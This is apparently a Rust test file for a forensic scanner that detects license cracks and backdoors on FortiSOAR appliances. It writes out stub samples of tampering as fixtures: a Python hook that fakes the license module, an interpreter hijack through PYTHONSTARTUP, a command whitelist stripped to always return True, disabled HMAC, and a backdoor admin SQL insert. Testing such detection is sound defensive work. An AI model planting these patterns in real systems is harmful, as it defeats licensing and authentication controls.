            h[124..136].copy_from_slice(sz.as_bytes());
            h[136..148].copy_from_slice(b"15000000000\0");
            h[148..156].fill(b' ');
            h[156] = b'0';
            h[257..265].copy_from_slice(b"ustar\x0000");
            let sum: u32 = h.iter().map(|&b| b as u32).sum();
            h[148..156].copy_from_slice(format!("{:06o}\0 ", sum).as_bytes());
            out.extend_from_slice(&h);
            out.extend_from_slice(data);
            let rem = data.len() % 512;
            if rem != 0 {
                out.resize(out.len() + (512 - rem), 0);
            }
        };
        append_ustar(&mut tar, "appliance.ovf", ovf.as_bytes());
        append_ustar(&mut tar, "appliance.mf", mf.as_bytes());
        append_ustar(&mut tar, "disk1.vmdk", &vmdk);
        tar.extend_from_slice(&[0u8; 1024]);
        fs::write(dest, tar).unwrap();
    };

    write_synthetic_ova(&ova_alpha, "soar-alpha-ova", 5_111_111_111_111_111_111, true);
    write_synthetic_ova(&ova_beta, "soar-beta-ova", 5_999_999_999_999_999_999, false);

    let bin = env!("CARGO_BIN_EXE_fsr-forensic-verdict");

    // 1. Inspect `ova_beta` via `--ova` + `--attribute-cracker` into `peers/beta_bundle.json`
    let beta_bundle = peers_dir.join("beta_bundle.json");
    let beta_out = std::process::Command::new(bin)
        .arg("--ova")
        .arg(&ova_beta)
        .arg("--attribute-cracker")
        .arg("--org-label")
        .arg("Org_Beta")
        .arg("-o")
        .arg(&beta_bundle)
        .output()
        .expect("run --ova on beta");
    assert_eq!(beta_out.status.code(), Some(2));

    // 2. Inspect `ova_alpha` via `--inspect-ova` + `--attribute-kit` + `--cluster-input peers/`
    let alpha_bundle = work.join("alpha_bundle.json");
    let alpha_out = std::process::Command::new(bin)
        .arg("--inspect-ova")
        .arg(&ova_alpha)
        .arg("--attribute-kit")
        .arg("--org-label")
        .arg("Org_Alpha")
        .arg("--cluster-input")
        .arg(&peers_dir)
        .arg("-o")
        .arg(&alpha_bundle)
        .output()
        .expect("run --inspect-ova on alpha");
    assert_eq!(alpha_out.status.code(), Some(2));

    let json_text = fs::read_to_string(&alpha_bundle).unwrap();
    assert!(json_text.contains("CRITICAL_OVA_MANIFEST_TAMPERED"));
    assert!(json_text.contains("CRITICAL_VMDK_CARVED_ELF_PATCH"));
    assert!(json_text.contains("CRITICAL_SAME_CRACKER_TOOLKIT_ATTRIBUTION"));
    assert!(json_text.contains("CKIT-SHA256-"));

    // 3. Offline cryptographic RFC 6962 Merkle & Non-Mutation verification MUST pass 100%
    let verification = fsr_forensic_verdict::bundle_verifier::verify_forensic_bundle_file(&alpha_bundle);
    assert!(
        verification.bundle_authentic,
        "sealed OVA attribution bundle must verify cleanly: {:?}",
        verification.errors
    );
    assert!(!json_text.contains("\"target_mutated\": true"));

    // 4. Verify SOP Stage 2 (`--root` + `--attribute-cracker` + `--expected-self-sha256` -> all 22 engines)
    let live_root = work.join("live_soar_root");
    fs::create_dir_all(live_root.join("usr/lib64")).unwrap();
    fs::write(
        live_root.join("usr/lib64/libssl.so.3"),
        build_minimal_elf64_so(
            "X509_verify_cert",
            &[0xf3, 0x0f, 0x1e, 0xfa, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3],
        ),
    )
    .unwrap();
    let self_bytes = fs::read(bin).unwrap();
    let self_sha256 = fsr_deep_audit::crypto::sha256_hex(&self_bytes);
    let stage2_bundle = work.join("02_full_forensic_bundle.json");
    let stage2_out = std::process::Command::new(bin)
        .arg("--root")
        .arg(&live_root)
        .arg("--expected-self-sha256")
        .arg(&self_sha256)
        .arg("--cluster-input")
        .arg(&peers_dir)
        .arg("--attribute-cracker")
        .arg("--org-label")
        .arg("Kurum_Canli_SOAR")
        .arg("--format")
        .arg("json")
        .arg("--pretty")
        .arg("-o")
        .arg(&stage2_bundle)
        .output()
        .expect("run SOP Stage 2");
    assert_eq!(stage2_out.status.code(), Some(2));
    let stage2_text = fs::read_to_string(&stage2_bundle).unwrap();
    assert!(stage2_text.contains("\"ova_stream_inspector\""));
    assert!(stage2_text.contains("\"vmdk_carver\""));
    assert!(stage2_text.contains("\"cracker_attribution\""));
    assert!(stage2_text.contains("CRITICAL_SAME_CRACKER_TOOLKIT_ATTRIBUTION"));
    assert!(stage2_text.contains("\"expected_sha256_verified\": true"));

    // 5. Verify SOP Stage 4 (`--verify-bundle 02_full_forensic_bundle.json`)
    let stage4_out = std::process::Command::new(bin)
        .arg("--verify-bundle")
        .arg(&stage2_bundle)
        .output()
        .expect("run SOP Stage 4 --verify-bundle");
    assert_eq!(stage4_out.status.code(), Some(0));

    let _ = fs::remove_dir_all(&work);
}

#[test]
fn test_realworld_cyops_auth_startup_hook_and_server_csdassrv_import_crack() {
    let work = create_temp_dir("cyops_auth_startup_hook_crack");

    // 1. Clean factory `cyops-auth` tree MUST produce 0 findings (0 false positives)
    let clean_root = work.join("clean_cyops_root");
    fs::create_dir_all(clean_root.join("opt/cyops-auth/server")).unwrap();
    fs::create_dir_all(clean_root.join("opt/cyops-auth/handlers")).unwrap();
    fs::create_dir_all(clean_root.join("opt/cyops-auth/handlerworkers")).unwrap();
    fs::create_dir_all(clean_root.join("opt/cyops-auth/bin")).unwrap();
    fs::create_dir_all(clean_root.join("opt/cyops-auth/utilities/ha")).unwrap();
    fs::create_dir_all(clean_root.join("opt/cyops-auth/sql/migration")).unwrap();
    fs::create_dir_all(clean_root.join("opt/cyops-auth/.env/bin")).unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/server/__init__.py"),
        b"\"\"\" Copyright start\n  Copyright (C) 2008 - 2025 Fortinet Inc.\n  Copyright end \"\"\"\n",
    )
    .unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/handlers/__init__.py"),
        b"\"\"\" Copyright start\n  Copyright (C) 2008 - 2025 Fortinet Inc.\n  Copyright end \"\"\"\n",
    )
    .unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/handlerworkers/__init__.py"),
        b"\"\"\" Copyright start\n  Copyright (C) 2008 - 2025 Fortinet Inc.\n  Copyright end \"\"\"\n",
    )
    .unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/server/csdassrv.py"),
        b"\"\"\" Copyright start\n  Copyright (C) 2008 - 2025 Fortinet Inc.\n  Copyright end \"\"\"\n\
import tornado.ioloop\nimport tornado.web\nfrom tornado.httpserver import HTTPServer\nimport ssl\nimport sys\nimport os\n\
from handlerworkers.fdnclient import start_fdn_client\n",
    )
    .unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/bin/fdnclient.jar"),
        b"PK\x03\x04\x14\x00\x00\x00\x08\x00META-INF/MANIFEST.MF",
    )
    .unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/utilities/das.ini"),
        b"[HMAC]\nhmac_ready = True\nhmac_private_key_path = dashmac/keys/\nhmac_lifetime = 30\n",
    )
    .unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/utilities/ha/listener.py"),
        b"import json\nfrom utilities.ha.supported_commands import LIST_OF_SUPPORTED_CMDS\ndef check_if_supported_cmd(cmd):\n    return any(cmd for _ in LIST_OF_SUPPORTED_CMDS)\n",
    )
    .unwrap();
    fs::write(
        clean_root.join("opt/cyops-auth/sql/das_prod.sql"),
        b"INSERT INTO users (user_id, login_id, password, uuid) VALUES ('215', 'csadmin', '$2a$12$hash', 'ce5a842b-fbbc-4c6e-8d35-a0438fcdf80c');\n\
INSERT INTO users (user_id, login_id, password, uuid) VALUES ('216', '6f3626c1-0da7-4b44-8d5e-43750f780a47', '', '6f3626c1-0da7-4b44-8d5e-43750f780a47');\n",
    )
    .unwrap();

    let clean_bundle = execute_forensic_verdict_command_center(&ForensicVerdictConfig {
        root_path: clean_root.clone(),
        ..Default::default()
    });
    assert_eq!(
        clean_bundle.verdict_summary.total_findings, 0,
        "clean factory cyops-auth must emit 0 false positives: {:?}",
        clean_bundle.merkle_envelope.sealed_findings
    );

    // 2. Cracked `cyops-auth` tree with:
    //    - Top-level `site-packages/runtime_hook.py` (`tornado.web.RequestHandler._execute`, `sys.modules["handlerworkers.license"]`, `FakeLicenseManager`, `FSRVMPTM99999999`),
    //    - Rogue script dropped in `/opt/cyops-auth/server/lic_bypass.py` + `import lic_bypass` added to `/opt/cyops-auth/server/csdassrv.py`,
    //    - Code injected into `/opt/cyops-auth/server/__init__.py`,
    //    - Live `csdassrv.py` process in `/proc/5050/maps` mapping `handlers/authenticationhandler.so` while `handlerworkers/license.so` on disk is ghosted via `sys.modules`!
    let cracked_root = work.join("cracked_cyops_root");
    fs::create_dir_all(
        cracked_root.join("opt/cyops-auth/.env/lib/python3.9/site-packages"),
    )
    .unwrap();
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/server")).unwrap();
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/handlers")).unwrap();
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/handlerworkers")).unwrap();
    fs::create_dir_all(cracked_root.join("proc/5050")).unwrap();

    fs::write(
        cracked_root.join("opt/cyops-auth/.env/lib/python3.9/site-packages/runtime_hook.py"),
        b"import sys, ssl\n\
from types import ModuleType\n\
ssl.SSLContext.load_cert_chain = _safe_load_cert_chain\n\
tornado.web.RequestHandler._execute = _guaranteed_execute\n\
class _FakeMod(ModuleType):\n\
    pass\n\
class FakeLicenseManager:\n\
    def is_valid_license(self): return True\n\
FAKE_CLAIMS = {'serial_no': 'FSRVMPTM99999999', 'hardware_key': 'MOCK-HARDWARE-UUID-KEY'}\n\
sys.modules[\"handlerworkers.license\"] = _fake_license_mod\n\
sys.modules[\"handlerworkers.fdnclient\"] = _fake_fdn_mod\n",
    )
    .unwrap();

    fs::write(
        cracked_root.join("opt/cyops-auth/server/lic_bypass.py"),
        b"# dropped sibling script in /server/\n",
    )
    .unwrap();
    fs::write(
        cracked_root.join("opt/cyops-auth/server/csdassrv.py"),
        b"import tornado.ioloop\nimport tornado.web\nimport lic_bypass\n",
    )
    .unwrap();
    fs::write(
        cracked_root.join("opt/cyops-auth/server/__init__.py"),
        b"\"\"\" Copyright start\n  Copyright end \"\"\"\nimport runtime_hook\n",
    )
    .unwrap();

    // Create `handlers/authenticationhandler.so` and `handlerworkers/license.so` on disk,
    // but only map `authenticationhandler.so` in `/proc/5050/maps` (simulating `sys.modules` Cython `.so` ghosting)
    let clean_so = build_minimal_elf64_so(
        "PyInit_authenticationhandler",
        &[0xf3, 0x0f, 0x1e, 0xfa, 0x55, 0x48, 0x89, 0xe5, 0x5d, 0xc3],
    );
    fs::write(
        cracked_root.join("opt/cyops-auth/handlers/authenticationhandler.so"),
        &clean_so,
    )
    .unwrap();
    fs::write(
        cracked_root.join("opt/cyops-auth/handlerworkers/license.so"),
        &clean_so,
    )
    .unwrap();
    fs::write(cracked_root.join("proc/5050/comm"), b"python3\n").unwrap();
    fs::write(
        cracked_root.join("proc/5050/cmdline"),
        b"/opt/cyops-auth/.env/bin/python\0/opt/cyops-auth/server/csdassrv.py\0start\0",
    )
    .unwrap();
    fs::write(
        cracked_root.join("proc/5050/maps"),
        b"00400000-00401000 r-xp 00000000 08:01 101 /opt/cyops-auth/handlers/authenticationhandler.so\n",
    )
    .unwrap();

    // Layers 6-11 multi-vector crack & backdoor tampering inside `cracked_root`:
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/bin")).unwrap();
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/utilities/ha")).unwrap();
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/sql/migration")).unwrap();
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/.env/bin")).unwrap();
    fs::create_dir_all(cracked_root.join("opt/cyops-auth/dashmac")).unwrap();

    // Layer 6: `bin/fdnclient.jar` replaced with a `#!` wrapper script
    fs::write(
        cracked_root.join("opt/cyops-auth/bin/fdnclient.jar"),
        b"#!/bin/sh\necho '{\"status\":200,\"serial\":\"FSRVMPTM99999999\"}'\nexit 0\n",
    )
    .unwrap();

    // Layer 7: `utilities/das.ini` HMAC disabled (`hmac_ready = False`)
    fs::write(
        cracked_root.join("opt/cyops-auth/utilities/das.ini"),
        b"[HMAC]\nhmac_ready = False\nhmac_private_key_path = /tmp/rogue_keys/\n",
    )
    .unwrap();

    // Layer 8: `.env/bin/python` replaced with a `#!` wrapper script
    fs::write(
        cracked_root.join("opt/cyops-auth/.env/bin/python"),
        b"#!/bin/sh\nexport PYTHONSTARTUP=/tmp/hook.py\nexec /usr/bin/python3.9 \"$@\"\n",
    )
    .unwrap();

    // Layer 9: `utilities/ha/listener.py` stripped of `LIST_OF_SUPPORTED_CMDS` whitelist
    fs::write(
        cracked_root.join("opt/cyops-auth/utilities/ha/listener.py"),
        b"import json\ndef check_if_supported_cmd(command):\n    return True\n",
    )
    .unwrap();

    // Layer 10: `sql/das_prod.sql` with unauthorized backdoor admin user
    fs::write(
        cracked_root.join("opt/cyops-auth/sql/das_prod.sql"),
        b"INSERT INTO users (user_id, login_id, password, uuid) VALUES ('999', 'rogue_root', '$2a$12$backdoor', '11111111-2222-3333-4444-555555555555');\n",
    )
    .unwrap();

    // Layer 11: `dashmac/hmacauthorizer.so` replaced with a non-ELF stub
    fs::write(
        cracked_root.join("opt/cyops-auth/dashmac/hmacauthorizer.so"),
        b"#!/bin/sh\n# fake .so replacement\n",
    )
    .unwrap();

    let cracked_bundle = execute_forensic_verdict_command_center(&ForensicVerdictConfig {
        root_path: cracked_root.clone(),
        attribute_cracker: true,
        ..Default::default()
    });

    let codes: Vec<&str> = cracked_bundle
        .merkle_envelope
        .sealed_findings
        .iter()
        .map(|sf| sf.finding.code.as_str())
        .collect();
    for expected_code in [
        "CRITICAL_PYTHON_STARTUP_HOOK_LICENSE_BYPASS",
        "CRITICAL_CYOPS_SERVER_ROGUE_SCRIPT_DROP",
        "CRITICAL_CYOPS_SERVER_UNAUTHORIZED_IMPORT_HOOK",
        "HIGH_CYOPS_INIT_PY_CODE_INJECTION",
        "CRITICAL_LIVE_CYTHON_SO_SYS_MODULES_GHOSTING",
        "CRITICAL_CYOPS_FDNCLIENT_JAR_TAMPERED",
        "CRITICAL_CYOPS_DAS_INI_AUTH_BYPASS",
        "CRITICAL_CYOPS_VENV_INTERPRETER_HIJACK",
        "CRITICAL_CYOPS_UTILITY_SCRIPT_TAMPERED",
        "CRITICAL_CYOPS_SQL_SEED_OR_MIGRATION_TAMPER",
        "CRITICAL_CYOPS_CYTHON_SO_BINARY_REPLACED",
    ] {
        assert!(
            codes.contains(&expected_code),
            "missing {} in {:?}",
            expected_code,
            codes
        );
    }

    let html = emit_forensic_report(&cracked_bundle, OutputFormat::Html, true);
    assert!(html.contains("Kurumsal Denetim"));
    assert!(html.contains("CRACK TESPİT EDİLDİ"));

    // Pillar 4: Verify Enterprise Inspection & Acceptance Report (`OutputFormat::DenetimTutanagi`)
    let clean_tutanak = emit_forensic_report(&clean_bundle, OutputFormat::DenetimTutanagi, true);
    assert!(clean_tutanak.contains("KABUL EDİLEBİLİR (ONAYLANDI)"));
    assert!(clean_tutanak.contains("TEKNİK BÜTÜNLÜK VE KABUL TUTANAĞI"));

    let cracked_tutanak = emit_forensic_report(&cracked_bundle, OutputFormat::DenetimTutanagi, true);
    assert!(cracked_tutanak.contains("KABUL EDİLEMEZ (REDDEDİLDİ)"));
    assert!(cracked_tutanak.contains("CRACK TESPİT EDİLDİ"));

    // Pillar 1: Verify Behavioral DAS `/auth/license` Canary Response & Snippet Inspector
    let forged_das_json = r#"{
        "status": 200,
        "message": "License is valid",
        "data": {
            "eulaAccepted": true,
            "is_eula_accepted": true,
            "licenseInstalled": true,
            "is_license_installed": true,
            "nodeEntryFound": true,
            "depl_status": true,
            "serial_no": "FSRVMPTM99999999",
            "hardware_key": "MOCK-HARDWARE-UUID-KEY",
            "users": 999
        }
    }"#;
    let snippet_findings =
        fsr_forensic_verdict::fsr_supplychain_backdoor_audit::web_auth_backdoor::inspect_text_snippet_for_cracks(
            "https://localhost:8085/auth/license",
            forged_das_json,
        );
    assert!(
        snippet_findings
            .iter()
            .any(|f| f.code == "CRITICAL_LIVE_DAS_TORNADO_LICENSE_INTERCEPT_ACTIVE"),
        "expected CRITICAL_LIVE_DAS_TORNADO_LICENSE_INTERCEPT_ACTIVE in {:?}",
        snippet_findings
    );

    // Pillar 2 & 3: Verify `build_quick_check_config` and `handle_portal_http_request`
    let (status_home, ct_home, body_home) =
        fsr_forensic_verdict::portal_server::handle_portal_http_request("GET / HTTP/1.1\r\n\r\n", &cracked_root);
    assert_eq!(status_home, 200);
    assert!(ct_home.starts_with("text/html"));
    assert!(body_home.contains("FORTISOAR &amp; FORTIGATE CRACK"));

    let scan_req = format!(
        "POST /api/scan HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{{\"path\":\"{}\"}}",
        cracked_root.to_string_lossy()
    );
    let (status_scan, _ct_scan, body_scan) =
        fsr_forensic_verdict::portal_server::handle_portal_http_request(&scan_req, &cracked_root);
    assert_eq!(status_scan, 200);
    assert!(body_scan.contains("\"status\": \"COMPROMISED_OR_CRACKED\""));
    assert!(body_scan.contains("CRITICAL_PYTHON_STARTUP_HOOK_LICENSE_BYPASS"));

    let (status_rep, _ct_rep, body_rep) =
        fsr_forensic_verdict::portal_server::handle_portal_http_request(
            "GET /api/acceptance-report HTTP/1.1\r\n\r\n",
            &cracked_root,
        );
    assert_eq!(status_rep, 200);
    assert!(body_rep.contains("KABUL EDİLEMEZ (REDDEDİLDİ)"));

    let _ = fs::remove_dir_all(&work);
}

#[test]
fn test_version_tagged_baseline_manifest_drift_and_catch_unwind_fault_isolation() {
    let work = create_temp_dir("baseline_drift_and_catch_unwind");

    // 1. Test 7.4.x auto-selection and report rendering
    let root_74 = work.join("node_74");
    fs::create_dir_all(root_74.join("opt/cyops-auth/server")).unwrap();
    fs::create_dir_all(root_74.join("opt/cyops-auth/utilities")).unwrap();
    fs::write(
        root_74.join("opt/cyops-auth/utilities/das.ini"),
        "[DEFAULT]\nversion = 7.4.3\n",
    )
    .unwrap();
    fs::write(
        root_74.join("opt/cyops-auth/server/csdassrv.py"),
        "import os\nimport tornado.ioloop\nimport tornado.web\n",
    )
    .unwrap();

    let bundle_74 = execute_forensic_verdict_command_center(&ForensicVerdictConfig {
        root_path: root_74,
        ..Default::default()
    });
    assert_eq!(bundle_74.verdict_summary.total_findings, 0);
    let md_74 = emit_forensic_report(&bundle_74, OutputFormat::Markdown, false);
    assert!(
        md_74.contains("fortisoar-7.4.x"),
        "report must record active fortisoar-7.4.x baseline profile: {}",
        md_74
    );

    // 2. Test Version Drift Protection on newer unrecognized FortiSOAR version (7.8.0)
    //    where `csdassrv.py` adds a benign new import (`import urllib.parse`) without dropping rogue `.py` files
    let root_78 = work.join("node_78_drift");
    fs::create_dir_all(root_78.join("opt/cyops-auth/server")).unwrap();
    fs::create_dir_all(root_78.join("opt/cyops-auth/utilities")).unwrap();
    fs::write(
        root_78.join("opt/cyops-auth/utilities/das.ini"),
        "[DEFAULT]\nversion = 7.8.0\n",
    )
    .unwrap();
    fs::write(
        root_78.join("opt/cyops-auth/server/csdassrv.py"),
        "import os\nimport urllib.parse\n",
    )
    .unwrap();

    let bundle_78 = execute_forensic_verdict_command_center(&ForensicVerdictConfig {
        root_path: root_78,
        ..Default::default()
    });
    assert_eq!(
        bundle_78.verdict_summary.critical_count, 0,
        "unrecognized newer version without rogue files must not trigger CRITICAL false positive"
    );
    assert!(
        bundle_78
            .merkle_envelope
            .sealed_findings
            .iter()
            .any(|sf| sf.finding.code == "MEDIUM_CYOPS_ENTRYPOINT_IMPORT_VERSION_DRIFT"),
        "must emit MEDIUM_CYOPS_ENTRYPOINT_IMPORT_VERSION_DRIFT"
    );

    // 3. Test `execute_isolated_engine_task` (`std::panic::catch_unwind` boundary)
    let fault_res: Result<(), _> = fsr_forensic_verdict::execute_isolated_engine_task(
        "simulated_corrupted_file_engine",
        fsr_deep_audit::schema::EngineId::PycInspector,
        "/opt/cyops-auth/corrupted.pyc",
        || {
            panic!("simulated corrupted header panic at offset 0x14");
        },
    );
    let (fault_summary, fault_finding) =
        fault_res.expect_err("panicking engine closure must be caught and isolated");
    let summary_str = fault_summary.to_json_string(false);
    assert!(summary_str.contains("engine_fault_isolated"));
    assert_eq!(fault_finding.code, "LOW_ENGINE_EXECUTION_FAULT_ISOLATED");
    assert!(fault_finding
        .summary
        .contains("simulated corrupted header panic"));

    let _ = fs::remove_dir_all(&work);
}
